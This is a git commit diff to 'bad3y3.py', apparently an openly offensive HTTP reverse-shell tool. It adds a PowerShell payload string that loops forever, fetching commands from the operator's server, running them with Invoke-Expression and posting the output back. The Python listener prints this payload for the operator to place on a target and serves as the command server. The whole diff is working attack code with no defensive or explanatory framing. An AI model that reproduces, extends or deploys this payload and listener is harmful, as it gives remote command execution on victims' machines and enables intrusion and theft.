1a5f7d6c972ef8a3c0e55d2cae4c5700047c7ce3
rick porto <118774522+user-lc1bd6fl4q@users.noreply.github.com>
2023-02-17 18:10:35 -0300

    Update bad3y3.py

--- bad3y3.py
+++ bad3y3.py
@@ -1,9 +1,15 @@
 import http.server, socketserver, signal
 
+ADDRESS = "0.0.0.0"
 PORT = 8000
 
 GREEN = '\033[38;5;47m'; END = '\033[0m'
 
+payload = f"Start-Job -ScriptBLock{{while ($true){{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body $c}}}}"
+print("{GREEN}Test{END} payload_powershell:")
+print("")
+print(payload)
+print("")
 
 class Http_Shell(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
@@ -24,7 +30,6 @@ class Http_Shell(http.server.BaseHTTPRequestHandler):
 def signal_handler(sig, frame):
     print("Closing server ...")
     httpd.server_close()
-
 
 with socketserver.TCPServer(("", PORT), Http_Shell) as httpd:
     print("Listening on port", PORT)
